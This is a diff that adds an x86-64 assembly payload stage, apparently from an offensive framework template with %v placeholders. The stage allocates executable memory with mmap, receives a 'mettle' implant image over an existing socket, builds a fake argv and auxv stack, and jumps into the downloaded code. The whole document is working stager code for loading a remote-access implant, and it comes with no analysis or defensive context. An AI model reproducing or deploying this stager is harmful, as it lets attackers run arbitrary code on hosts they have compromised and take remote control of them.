@@ -1,0 +1,46 @@
+      push rdi                    ; save sockfd
+      xor rdi, rdi                ; address
+      mov rsi, %v  ; length
+      mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE
+      mov r10, 0x22               ; MAP_PRIVATE | MAP_ANONYMOUS
+      xor r8, r8                  ; fd
+      xor r9, r9                  ; offset
+      mov rax, 0x9                ; mmap
+      syscall
+
+      ; receive mettle process image
+      mov rdx, rsi                ; length
+      mov rsi, rax                ; address
+      pop rdi                     ; sockfd
+      mov r10, 0x100              ; MSG_WAITALL
+      xor r8, r8                  ; srcaddr 0
+      xor r9, r9                  ; addrlen 0
+      mov rax, 0x2d               ; recvfrom 
+      syscall
+
+      ; setup stack
+      and rsp, -0x10              ; Align
+      add sp, 0x50                ; Add room for initial stack and prog name
+      mov rax, 0x6d               ; prog name "m"
+      push rax                    ;
+      mov rcx, rsp                ; get the stack ;prog name here.
+      xor rbx, rbx
+      push rbx                    ; NULL
+      push rbx                    ; AT_NULL
+      push rsi                    ; mmap'd a ddress
+	  ;nop
+      mov rax, 7                  ; AT_BASE
+      push rax
+      push rbx                    ; end of ENV
+      push rbx                    ; NULL
+      push rdi                    ; ARGV[1] int sockfd
+      push rcx                    ; ARGV[0] char *prog_name
+	  ;mov rax, rcx 
+	  ;nop
+      mov rax, 2                  ; ARGC
+      push rax
+
+      ; down the rabbit hole
+      mov rax, %v 
+      add rsi, rax
+      jmp rsi
